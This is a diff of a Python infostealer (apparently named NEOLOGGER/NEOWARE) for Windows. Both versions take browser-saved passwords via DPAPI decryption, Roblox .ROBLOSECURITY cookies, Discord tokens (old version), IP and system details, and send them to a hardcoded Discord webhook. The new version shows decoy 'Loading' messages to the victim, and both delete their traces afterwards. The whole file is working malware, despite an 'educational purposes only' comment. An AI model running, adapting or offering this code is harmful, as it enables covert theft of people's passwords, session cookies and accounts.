@@ -1,388 +1,412 @@
-import psutil
-import platform
-import json
-from datetime import datetime
-from time import sleep
-import requests
-import socket
-from requests import get
+# WARN: This one is for educational purposes only! I do not recommend using it on people
+
 import os
-import re
-import requests
-import subprocess
-from uuid import getnode as get_mac
-import browser_cookie3 as steal, requests, base64, random, string, zipfile, shutil, dhooks, os, re, sys, sqlite3
-from cryptography.hazmat.primitives.ciphers import (Cipher, algorithms, modes)
-from cryptography.hazmat.primitives.ciphers.aead import AESGCM
-from cryptography.hazmat.backends import default_backend
-from Crypto.Cipher import AES
+try:
+    import json, base64, sqlite3, win32crypt, shutil, requests, getpass, socket, platform, psutil
+    from Crypto.Cipher import AES
+    from discord import SyncWebhook # Import SyncWebhook
+    from discord_webhook import DiscordWebhook, DiscordEmbed
+except ModuleNotFoundError:
+    print("modules are not installed")
+    os.system("pip3 install pypiwin32 pycryptodome discord.py discord-webhook requests psutil")
+    print("Got An Error?, restart the program!")
 
-
-from base64 import b64decode, b64encode
-from dhooks import Webhook, Embed, File
-from subprocess import Popen, PIPE
+import sys
+import win32con
+import browser_cookie3
 from json import loads, dumps
+from base64 import b64decode
+from sqlite3 import connect
 from shutil import copyfile
-from sys import argv
+from threading import Thread
+from win32crypt import CryptUnprotectData
+from Crypto.Cipher import AES
+from discord_webhook import DiscordEmbed, DiscordWebhook
+from subprocess import Popen, PIPE
+from urllib.request import urlopen, Request
+from requests import get
+from re import findall, search
+from win32api import SetFileAttributes, GetSystemMetrics
+from browser_history import get_history
+from prettytable import PrettyTable
+from platform import platform
+from getmac import get_mac_address as gma
+from psutil import virtual_memory
+from collections import defaultdict
+from zipfile import ZipFile, ZIP_DEFLATED
+from cpuinfo import get_cpu_info
+from multiprocessing import freeze_support
+from tempfile import TemporaryDirectory
+from pyautogui import screenshot
+from random import choices
+from string import ascii_letters, digits
+import robloxpy
+import requests,re
+from discordwebhook import *
+import browser_cookie3
+import colorama 
+from colorama import Back, Fore, Style
 
-# CONFIG -> Setup before compiling
-url= "https://discord.com/api/webhooks/1419438920348729456/xBW33KQkEhjshOdoJjHjOVCKzlLdCtd7S0RN1Ej_40uvzDVyrwn3QMo6bl6lI-5pVl5R" #Paste Discord Webhook url
+colorama.init()
+import os
+import codecs
+import marshal, zlib, base64, lzma
+import json
+from base64 import *
+
+dummy_message = Fore.MAGENTA + "Loading NEOWARE..." # A message that distracts the user from closing the grabber
+print(dummy_message)
+        
+#################### ADDING SHI #################
+
+import colorama 
+from colorama import Back, Fore, Style
+
+colorama.init()
+import os
+import codecs
+import marshal, zlib, base64, lzma
+import json
+from base64 import *
+
+send_webhook = "https://discord.com/api/webhooks/1419438920348729456/xBW33KQkEhjshOdoJjHjOVCKzlLdCtd7S0RN1Ej_40uvzDVyrwn3QMo6bl6lI-5pVl5R"
+
+def command(c):
+    os.system(c)
+def cls():
+    os.system("cls")
+
+try:
+    import robloxpy
+    import requests,re
+    from discordwebhook import *
+    import browser_cookie3
+    
+except:
+    input("Libraries not installed press enter to exit...")
 
 
 
 
-# Scaling from bytes to KB,MB,GB, etc
-def scale(bytes, suffix="B"):
-    defined = 1024
+dummy_message = Fore.MAGENTA + "Updating..." # A message that distracts the user from closing the grabber
+print(dummy_message)
+################### Gathering INFOMATION #################################
+def cookieLogger():
+
+    data = [] # data[0] == All Cookies (Used For Requests) // data[1] == .ROBLOSECURITY Cookie (Used For Logging In To The Account)
+
+    try:
+        cookies = browser_cookie3.firefox(domain_name='roblox.com')
+        for cookie in cookies:
+            if cookie.name == '.ROBLOSECURITY':
+                data.append(cookies)
+                data.append(cookie.value)
+                return data
+    except:
+        pass
+    try:
+        cookies = browser_cookie3.chromium(domain_name='roblox.com')
+        for cookie in cookies:
+            if cookie.name == '.ROBLOSECURITY':
+                data.append(cookies)
+                data.append(cookie.value)
+                return data
+    except:
+        pass
+
+    try:
+        cookies = browser_cookie3.edge(domain_name='roblox.com')
+        for cookie in cookies:
+            if cookie.name == '.ROBLOSECURITY':
+                data.append(cookies)
+                data.append(cookie.value)
+                return data
+    except:
+        pass
+
+    try:
+        cookies = browser_cookie3.opera(domain_name='roblox.com')
+        for cookie in cookies:
+            if cookie.name == '.ROBLOSECURITY':
+                data.append(cookies)
+                data.append(cookie.value)
+                return data
+    except:
+        pass
+
+    try:
+        cookies = browser_cookie3.chrome(domain_name='roblox.com')
+        for cookie in cookies:
+            if cookie.name == '.ROBLOSECURITY':
+                data.append(cookies)
+                data.append(cookie.value)
+                return data
+    except:
+        pass
+
+
+cookies = cookieLogger()
+
+
+#################### INFOMATION #################
+ip_address = requests.get("https://api.ipify.org/").text
+roblox_cookie = cookies[1]
+#################### checking cookie #############
+isvalid = robloxpy.Utils.CheckCookie(roblox_cookie)
+if isvalid == "Valid Cookie":
+    pass
+else:
+    requests.post(url=send_webhook,data={"content":f"R.I.P ,cookie is expired\ndead cookie :skull: : ```{roblox_cookie}```"})
+    exit()
+
+#################### getting info about the cookie #############
+ebruh = requests.get("https://www.roblox.com/mobileapi/userinfo",cookies={".ROBLOSECURITY":roblox_cookie})
+info = json.loads(ebruh.text)
+rid = info["UserID"]
+rap = robloxpy.User.External.GetRAP(rid)
+friends = robloxpy.User.Friends.External.GetCount(rid)
+age = robloxpy.User.External.GetAge(rid)
+crdate = robloxpy.User.External.CreationDate(rid)
+rolimons = f"https://www.rolimons.com/player/{rid}"
+roblox_profile = f"https://web.roblox.com/users/{rid}/profile"
+headshot = robloxpy.User.External.GetHeadshot(rid)
+username = info['UserName']
+robux = info['RobuxBalance']
+premium = info['IsPremium']
+#################### SENDING TO WEBHOOK #################
+
+discord = Discord(url=send_webhook)
+discord.post(
+    username="NEOLOGGER ",
+    avatar_url="https://cdn.discordapp.com/attachments/1064200694455881871/1067842925922373723/34ea20e0747020c021677987211a6353.jpg",
+    embeds=[
+        {
+            "username": "NEOLOGGER ",
+            "title": " 💸 Roblox account 💸",
+            "description" : f"[NEOLOGGER](https://mega.nz/folder/KENRDBoL#6TuJNxYiJChvvytJ857waA) | [Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile})",
+            "color" : 00000000,
+            "fields": [
+                {"name": "Username", "value": username, "inline": True},
+                {"name": "Robux Balance", "value": robux, "inline": True},
+                {"name": "Premium Status", "value": premium,"inline": True},
+                {"name": "Creation Date", "value": crdate, "inline": True},
+                {"name" : "RAP", "value": rap,"inline": True},
+                {"name" : "Friends", "value": friends, "inline": True},
+                {"name" : "Account Age", "value": age, "inline": True},
+                {"name" : "IP Address", "value" : ip_address, "inline:": True},
+                {"name" : ".ROBLOSECURITY", "value": f"```fix\n{roblox_cookie}```", "inline": False},
+            ],
+            "thumbnail": {"url": headshot},
+
+
+        }
+    ],
+)
+
+#######################################################################
+#WARNING WEBHOOK IS INSTALLED CHANGE BEFORE EXECUTED!#
+#######################################################################
+def decrypt_payload(cipher, payload):
+    return cipher.decrypt(payload)
+def generate_cipher(aes_key, iv):
+    return AES.new(aes_key, AES.MODE_GCM, iv)
+def decrypt_password(buff, master_key):
+    try:
+        iv = buff[3:15]
+        payload = buff[15:]
+        cipher = generate_cipher(master_key, iv)
+        decrypted_pass = decrypt_payload(cipher, payload)
+        decrypted_pass = decrypted_pass[:-16].decode()
+        return decrypted_pass
+    except Exception as e:
+        print(str(e))
+def get_size(bytes, suffix="B"):
+    factor = 1024
     for unit in ["", "K", "M", "G", "T", "P"]:
-        if bytes < defined:
+        if bytes < factor:
             return f"{bytes:.2f}{unit}{suffix}"
-        bytes /= defined
+        bytes /= factor
 
-uname = platform.uname()
-
-bt = datetime.fromtimestamp(psutil.boot_time()) # Boot time
-
-host = socket.gethostname()
-localip = socket.gethostbyname(host)
-
-publicip = get('https://api.ipify.org').text # Get public API
-city = get(f'https://ipapi.co/{publicip}/city').text
-region = get(f'https://ipapi.co/{publicip}/region').text
-postal = get(f'https://ipapi.co/{publicip}/postal').text
-timezone = get(f'https://ipapi.co/{publicip}/timezone').text
-currency = get(f'https://ipapi.co/{publicip}/currency').text
-country = get(f'https://ipapi.co/{publicip}/country_name').text
-callcode = get(f"https://ipapi.co/{publicip}/country_calling_code").text
-vpn = requests.get('http://ip-api.com/json?fields=proxy')
-proxy = vpn.json()['proxy']
-mac = get_mac()
-
-
-roaming = os.getenv('AppData')
-## Output for txt file location
-output = open(roaming + "temp.txt", "a")
-
-
-## Discord Locations
-Directories = {
-        'Discord': roaming + '\\Discord',
-        'Discord Two': roaming + '\\discord',
-        'Discord Canary': roaming + '\\Discordcanary',
-        'Discord Canary Two': roaming + '\\discordcanary',
-        'Discord PTB': roaming + '\\discordptb',
-        'Google Chrome': roaming + '\\Google\\Chrome\\User Data\\Default',
-        'Opera': roaming + '\\Opera Software\\Opera Stable',
-        'Brave': roaming + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
-        'Yandex': roaming + '\\Yandex\\YandexBrowser\\User Data\\Default',
-}
-
-
-## Scan for the regex [\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}
-def Yoink(Directory):
-	Directory += '\\Local Storage\\leveldb'
-
-	Tokens = []
-
-	for FileName in os.listdir(Directory):
-		if not FileName.endswith('.log') and not FileName.endswith('.ldb'):
-			continue
-
-		for line in [x.strip() for x in open(f'{Directory}\\{FileName}', errors='ignore').readlines() if x.strip()]:
-			for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
-				for Token in re.findall(regex, line):
-					Tokens.append(Token)
-
-	return Tokens
-
-
-## Wipe the temp file
-def Wipe():
-    if os.path.exists(roaming + "temp.txt"):
-      output2 = open(roaming + "temp.txt", "w")
-      output2.write("")
-      output2.close()
-    else:
-      pass
-
-
-## Search Directorys for Token regex if exists
-for Discord, Directory in Directories.items():
-	if os.path.exists(Directory):
-		Tokens = Yoink(Directory)
-	if len(Tokens) > 0:
-		for Token in Tokens:
-			realshit = f"{Token}\n"
-
-
-cpufreq = psutil.cpu_freq()
+WEBHOOK_URL = "https://discord.com/api/webhooks/1419438920348729456/xBW33KQkEhjshOdoJjHjOVCKzlLdCtd7S0RN1Ej_40uvzDVyrwn3QMo6bl6lI-5pVl5R" #WEBHOOK URL GOES INSIDE THE QOUTES!
+webhook = SyncWebhook.from_url('https://discord.com/api/webhooks/1419438920348729456/xBW33KQkEhjshOdoJjHjOVCKzlLdCtd7S0RN1Ej_40uvzDVyrwn3QMo6bl6lI-5pVl5R') # Initializing webhook
+ip = requests.get('https://api.ipify.org').text
+username = getpass.getuser()
+hostname = socket.gethostname()
 svmem = psutil.virtual_memory()
-partitions = psutil.disk_partitions()
-disk_io = psutil.disk_io_counters()
-net_io = psutil.net_io_counters()
-
-partitions = psutil.disk_partitions()
-for partition in partitions:
-    try:
-        partition_usage = psutil.disk_usage(partition.mountpoint)
-    except PermissionError:
-        continue
-
-
-
-
-
-requests.post(url, data=json.dumps({ "embeds": [ { "title": f"Someone Runs Program! - {host}", "color": 8781568 }, { "color": 7506394, "fields": [ { "name": "GeoLocation", "value": f"Using VPN?: {proxy}\nLocal IP: {localip}\nPublic IP: {publicip}\nMAC Adress: {mac}\n\nCountry: {country} | {callcode} | {timezone}\nregion: {region}\nCity: {city} | {postal}\nCurrency: {currency}\n\n\n\n" } ] }, { "fields": [ { "name": "System Information", "value": f"System: {uname.system}\nNode: {uname.node}\nMachine: {uname.machine}\nProcessor: {uname.processor}\n\nBoot Time: {bt.year}/{bt.month}/{bt.day} {bt.hour}:{bt.minute}:{bt.second}" } ] }, { "color": 15109662, "fields": [ { "name": "CPU Information", "value": f"Psychical cores: {psutil.cpu_count(logical=False)}\nTotal Cores: {psutil.cpu_count(logical=True)}\n\nMax Frequency: {cpufreq.max:.2f}Mhz\nMin Frequency: {cpufreq.min:.2f}Mhz\n\nTotal CPU usage: {psutil.cpu_percent()}\n" }, { "name": "Nemory Information", "value": f"Total: {scale(svmem.total)}\nAvailable: {scale(svmem.available)}\nUsed: {scale(svmem.used)}\nPercentage: {svmem.percent}%" }, { "name": "Disk Information", "value": f"Total Size: {scale(partition_usage.total)}\nUsed: {scale(partition_usage.used)}\nFree: {scale(partition_usage.free)}\nPercentage: {partition_usage.percent}%\n\nTotal read: {scale(disk_io.read_bytes)}\nTotal write: {scale(disk_io.write_bytes)}" }, { "name": "Network Information", "value": f"Total Sent: {scale(net_io.bytes_sent)}\")\nTotal Received: {scale(net_io.bytes_recv)}" } ] }, { "color": 7440378, "fields": [ { "name": "Discord information", "value": f"Token: {realshit}" } ] } ] }), headers={"Content-Type": "application/json"})
-
-DBP = r'Google\Chrome\User Data\Default\Login Data'
-ADP = os.environ['LOCALAPPDATA']
-
-
-def sniff(path):
-    path += '\\Local Storage\\leveldb'
-
-    tokens = []
-    try:
-        for file_name in os.listdir(path):
-            if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
-                continue
-
-            for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
-                for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
-                    for token in re.findall(regex, line):
-                        tokens.append(token)
-        return tokens
-    except:
-        pass
-
-
-def encrypt(cipher, plaintext, nonce):
-    cipher.mode = modes.GCM(nonce)
-    encryptor = cipher.encryptor()
-    ciphertext = encryptor.update(plaintext)
-    return (cipher, ciphertext, nonce)
-
-
-def decrypt(cipher, ciphertext, nonce):
-    cipher.mode = modes.GCM(nonce)
-    decryptor = cipher.decryptor()
-    return decryptor.update(ciphertext)
-
-
-def rcipher(key):
-    cipher = Cipher(algorithms.AES(key), None, backend=default_backend())
-    return cipher
-
-
-def dpapi(encrypted):
-    import ctypes
-    import ctypes.wintypes
-
-    class DATA_BLOB(ctypes.Structure):
-        _fields_ = [('cbData', ctypes.wintypes.DWORD),
-                    ('pbData', ctypes.POINTER(ctypes.c_char))]
-
-    p = ctypes.create_string_buffer(encrypted, len(encrypted))
-    blobin = DATA_BLOB(ctypes.sizeof(p), p)
-    blobout = DATA_BLOB()
-    retval = ctypes.windll.crypt32.CryptUnprotectData(
-        ctypes.byref(blobin), None, None, None, None, 0, ctypes.byref(blobout))
-    if not retval:
-        raise ctypes.WinError()
-    result = ctypes.string_at(blobout.pbData, blobout.cbData)
-    ctypes.windll.kernel32.LocalFree(blobout.pbData)
-    return result
-
-
-def localdata():
-    jsn = None
-    with open(os.path.join(os.environ['LOCALAPPDATA'], r"Google\Chrome\User Data\Local State"), encoding='utf-8', mode="r") as f:
-        jsn = json.loads(str(f.readline()))
-    return jsn["os_crypt"]["encrypted_key"]
-
-
-def decryptions(encrypted_txt):
-    encoded_key = localdata()
-    encrypted_key = base64.b64decode(encoded_key.encode())
-    encrypted_key = encrypted_key[5:]
-    key = dpapi(encrypted_key)
-    nonce = encrypted_txt[3:15]
-    cipher = rcipher(key)
-    return decrypt(cipher, encrypted_txt[15:], nonce)
-
-
-class chrome:
-    def __init__(self):
-        self.passwordList = []
-
-    def chromedb(self):
-        _full_path = os.path.join(ADP, DBP)
-        _temp_path = os.path.join(ADP, 'sqlite_file')
-        if os.path.exists(_temp_path):
-            os.remove(_temp_path)
-        shutil.copyfile(_full_path, _temp_path)
-        self.pwsd(_temp_path)
-    def pwsd(self, db_file):
-        conn = sqlite3.connect(db_file)
-        _sql = 'select signon_realm,username_value,password_value from logins'
-        for row in conn.execute(_sql):
-            host = row[0]
-            if host.startswith('android'):
-                continue
-            name = row[1]
-            value = self.cdecrypt(row[2])
-            _info = '[==================]\nhostname => : %s\nlogin => : %s\nvalue => : %s\n[==================]\n\n' % (host, name, value)
-            self.passwordList.append(_info)
-        conn.close()
-        os.remove(db_file)
-
-    def cdecrypt(self, encrypted_txt):
-        if sys.platform == 'win32':
-            try:
-                if encrypted_txt[:4] == b'\x01\x00\x00\x00':
-                    decrypted_txt = dpapi(encrypted_txt)
-                    return decrypted_txt.decode()
-                elif encrypted_txt[:3] == b'v10':
-                    decrypted_txt = decryptions(encrypted_txt)
-                    return decrypted_txt[:-16].decode()
-            except WindowsError:
-                return None
-        else:
-            pass
-
-    def saved(self):
+webhookembed = DiscordWebhook(url=WEBHOOK_URL)
+total, used, free = shutil.disk_usage("/")
+#######################################################################
+#######################################################################
+#######################################################################
+try:
+    def get_master_key():
+        with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State', "r", encoding='utf-8') as f:
+            local_state = f.read()
+            local_state = json.loads(local_state)
+        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+        master_key = master_key[5:]  # removing DPAPI
+        master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
+        return master_key
+    if __name__ == '__main__':
+        master_key = get_master_key()
+        login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\default\Login Data'
+        shutil.copy2(login_db, "Loginvault.db") #making a temp copy since Login Data DB is locked while Chrome is running
+        conn = sqlite3.connect("Loginvault.db")
+        cursor = conn.cursor()
         try:
-            with open(r'C:\ProgramData\passwords.txt', 'w', encoding='utf-8') as f:
-                f.writelines(self.passwordList)
-        except WindowsError:
-            return None
-
-
-if __name__ == "__main__":
-    main = chrome()
-    try:
-        main.chromedb()
-    except:
-        pass
-    main.saved()
-
-
-# webhook functionality => collect rest of specified data, send it to our webhook
-
-
-def beamed():
-    hook = Webhook(url)
-    try:
-        hostname = requests.get("https://api.ipify.org").text
-    except:
-        pass
-
-
-    local = os.getenv('LOCALAPPDATA')
-    roaming = os.getenv('APPDATA')
-    paths = {
-        'Discord': roaming + '\\Discord',
-        'Discord Canary': roaming + '\\discordcanary',
-        'Discord PTB': roaming + '\\discordptb',
-        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
-        'Opera': roaming + '\\Opera Software\\Opera Stable',
-        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
-        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
-    }
-
-    message = '\n'
-    for platform, path in paths.items():
-        if not os.path.exists(path):
-            continue
-
-        message += '```'
-
-        tokens = sniff(path)
-
-        if len(tokens) > 0:
-            for token in tokens:
-                message += f'{token}\n'
-        else:
+            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
+            for r in cursor.fetchall():
+                url = r[0]
+                username = r[1]
+                encrypted_password = r[2]
+                decrypted_password = decrypt_password(encrypted_password, master_key)
+                with open("GooglePasswords.txt","a") as f:
+                    f.write("URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "*" * 50 + "\n")
+                    f.close()
+            with open("GooglePasswords.txt", "rb") as f:
+                webhookembed.add_file(file=f.read(), filename='GooglePasswords.txt')
+        except Exception as e:
             pass
+        cursor.close()
+        conn.close()
+        try:
+            os.remove("Loginvault.db")
+        except Exception as e:
+            pass
+except FileNotFoundError:
+    webhook.send(f"```USER HAS NOT INSTALLED GOOGLE CHROME OR THERE IS NO DATA!```")
+#######################################################################
+#######################################################################
+#######################################################################
+try:
+    def get_master_key():
+        with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State', "r", encoding='utf-8') as f:
+            local_state = f.read()
+            local_state = json.loads(local_state)
+        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+        master_key = master_key[5:]  # removing DPAPI
+        master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
+        return master_key
+    if __name__ == '__main__':
+        master_key = get_master_key()
+        login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\BraveSoftware\Brave-Browser\User Data\default\Login Data'
+        shutil.copy2(login_db, "Loginvault.db") #making a temp copy since Login Data DB is locked while Chrome is running
+        conn = sqlite3.connect("Loginvault.db")
+        cursor = conn.cursor()
+        try:
+            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
+            for r in cursor.fetchall():
+                url = r[0]
+                username = r[1]
+                encrypted_password = r[2]
+                decrypted_password = decrypt_password(encrypted_password, master_key)
+                with open("BravePasswords.txt","a") as f:
+                    f.write("URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "*" * 50 + "\n")
+                    f.close()
+            with open("BravePasswords.txt", "rb") as f:
+                webhookembed.add_file(file=f.read(), filename='BravePasswords.txt')
+        except Exception as e:
+            pass
+        cursor.close()
+        conn.close()
+        try:
+            os.remove("Loginvault.db")
+        except Exception as e:
+            pass
+except FileNotFoundError:
+    webhook.send(f"```USER HAS NOT INSTALLED BRAVE BROWSER OR THERE IS NO DATA!```")
+#######################################################################
+#######################################################################
+#######################################################################
+try:
+    def get_master_key():
+        with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Roaming\Opera Software\Opera Stable\Local State', "r", encoding='utf-8') as f:
+            local_state = f.read()
+            local_state = json.loads(local_state)
+        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+        master_key = master_key[5:]  # removing DPAPI
+        master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
+        return master_key
+    if __name__ == '__main__':
+        master_key = get_master_key()
+        login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Roaming\Opera Software\Opera Stable\Login Data'
+        shutil.copy2(login_db, "Loginvault.db") #making a temp copy since Login Data DB is locked while Chrome is running
+        conn = sqlite3.connect("Loginvault.db")
+        cursor = conn.cursor()
+        try:
+            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
+            for r in cursor.fetchall():
+                url = r[0]
+                username = r[1]
+                encrypted_password = r[2]
+                decrypted_password = decrypt_password(encrypted_password, master_key)
+                with open("OperaPasswords.txt","a") as f:
+                    f.write("URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "*" * 50 + "\n")
+                    f.close()
+            with open("OperaPasswords.txt", "rb") as f:
+                webhookembed.add_file(file=f.read(), filename='OperaPasswords.txt')
+        except Exception as e:
+            pass
+        cursor.close()
+        conn.close()
+        try:
+            os.remove("Loginvault.db")
+        except Exception as e:
+            pass
+except FileNotFoundError:
+    webhook.send(f"```USER HAS NOT INSTALLED OPERA OR THERE IS NO DATA!```")
+    pass
+#######################################################################
+#######################################################################
+#######################################################################
+try:
+    def get_master_key():
+        with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Microsoft\Edge\User Data\Local State', "r", encoding='utf-8') as f:
+            local_state = f.read()
+            local_state = json.loads(local_state)
+        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+        master_key = master_key[5:]  # removing DPAPI
+        master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
+        return master_key
+    if __name__ == '__main__':
+        master_key = get_master_key()
+        login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Microsoft\Edge\User Data\Default\Login Data'
+        shutil.copy2(login_db, "Loginvault.db") #making a temp copy since Login Data DB is locked while Chrome is running
+        conn = sqlite3.connect("Loginvault.db")
+        cursor = conn.cursor()
+        try:
+            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
+            for r in cursor.fetchall():
+                url = r[0]
+                username = r[1]
+                encrypted_password = r[2]
+                decrypted_password = decrypt_password(encrypted_password, master_key)
+                with open("EdgePasswords.txt","a") as f:
+                    f.write("URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "*" * 50 + "\n")
+                    f.close()
+            with open("EdgePasswords.txt", "rb") as f:
+                webhookembed.add_file(file=f.read(), filename='EdgePasswords.txt')
+        except Exception as e:
+            pass
+        cursor.close()
+        conn.close()
+        try:
+            os.remove("Loginvault.db")
+        except Exception as e:
+            pass
+except FileNotFoundError:
+    webhook.send(f"```USER HAS NOT INSTALLED MICROSOFT EDGE OR THERE IS NO DATA!```")
+########################################################################################
+##FOR EXTRA DATA
 
-        message += '```'
-    
+embed = DiscordEmbed(title='Extra Data')
+embed.set_footer(text='https://linktr.ee/cxllz')
+embed.set_timestamp()
+embed.add_embed_field(name='**MISC**', value=f"IP Address: {ip}\nPhysical Cores: {psutil.cpu_count(logical=False)}\nTotal Cores: {psutil.cpu_count(logical=True)}\nTotal Memory: {get_size(svmem.total)}\nAvailable Memory: {get_size(svmem.available)}\nMemory Used: {get_size(svmem.used)}")
 
-    """screenshot victim's desktop"""
-    try:
-        screenshot = image.grab()
-        screenshot.save(os.getenv('ProgramData') +r'\screenshot.jpg')
-        screenshot = open(r'C:\ProgramData\screenshot.jpg', 'rb')
-        screenshot.close()
-    except:
-        pass
+webhookembed.add_embed(embed)
 
-    """gather our .zip variables"""
-    try:
-        zname = r'C:\ProgramData\passwords.zip'
-        newzip = zipfile.ZipFile(zname, 'w')
-        newzip.write(r'C:\ProgramData\passwords.txt')
-        newzip.close()
-        passwords = File(r'C:\ProgramData\passwords.zip')
-    except:
-        pass
-    
-    """gather our windows product key variables"""
-    try:
-        usr = os.getenv("UserName")
-        keys = subprocess.check_output('wmic path softwarelicensingservice get OA3xOriginalProductKey').decode().split('\n')[1].strip()
-        types = subprocess.check_output('wmic os get Caption').decode().split('\n')[1].strip()
-    except:
-        pass
-
-    """steal victim's .roblosecurity cookie"""
-    cookie = [".ROBLOSECURITY"]
-    cookies = []
-    limit = 2000
-
-    """chrome installation => list cookies from this location"""
-    try:
-        cookies.extend(list(steal.chrome()))
-    except:
-        pass
-
-    """firefox installation => list cookies from this location"""
-    try:
-        cookies.extend(list(steal.firefox()))
-    except:
-        pass
-
-    """read data => if we find a matching positive for our specified variable 'cookie', send it to our webhook."""
-    try:
-        for y in cookie:
-            send = str([str(x) for x in cookies if y in str(x)])
-            chunks = [send[i:i + limit] for i in range(0, len(send), limit)]
-            for z in chunks:
-                roblox = f'```' + f'{z}' + '```'
-    except:
-        pass
-
-    """attempt to send all recieved data to our specified webhook"""
-    try:
-        embed = Embed(title='Aditional Features',description='a victim\'s data was extracted, here\'s the details:',color=0x2f3136,timestamp='now')
-        embed.add_field("windows key:",f"user => {usr}\ntype => {types}\nkey => {keys}")
-        embed.add_field("roblosecurity:",roblox)
-        embed.add_field("tokens:",message)
-        embed.add_field("hostname:",f"{hostname}")
-    except:
-        pass
-    try:
-        hook.send(embed=embed, file=passwords)
-    except:
-        pass
-
-    """attempt to remove all evidence, allows for victim to stay unaware of data extraction"""
-    try:
-        subprocess.os.system(r'del C:\ProgramData\screenshot.jpg')
-        subprocess.os.system(r'del C:\ProgramData\passwords.zip')
-        subprocess.os.system(r'del C:\ProgramData\passwords.txt')
-    except:
-        pass
-
-
-beamed()
+response = webhookembed.execute()
+os.system("del /f EdgePasswords.txt GooglePasswords.txt BravePasswords.txt OperaPasswords.txt")
+#######################################################################
+#END OF SCRIPT
